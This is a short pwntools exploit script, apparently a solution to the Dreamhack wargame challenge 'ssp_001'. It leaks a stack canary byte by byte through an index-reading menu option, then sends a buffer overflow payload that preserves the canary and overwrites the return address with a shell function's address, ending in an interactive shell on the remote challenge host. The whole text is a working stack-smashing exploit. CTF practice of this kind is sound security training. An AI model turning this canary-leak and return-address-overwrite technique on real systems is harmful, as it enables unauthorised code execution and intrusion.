from pwn import *

p = process("./ssp_001")

p = remote("host1.dreamhack.games",8444)

def pbox(num):
    p.sendlineafter(">","P")
    p.sendlineafter("index :",str(num))
    p.recvuntil("is : ")
    recv = p.recv(2)
    return recv

shell = 0x80486b9

canary = int(pbox(0x83) + pbox(0x82) + pbox(0x81) + pbox(0x80),16)
log.info(hex(canary))

payload = ""
payload += "a"*0x40
payload += p32(canary)
payload += "b"*8
payload += p32(shell)

p.sendlineafter(">","E")
p.sendlineafter("Size :",str(100))
p.sendlineafter("Name :",payload)

p.interactive()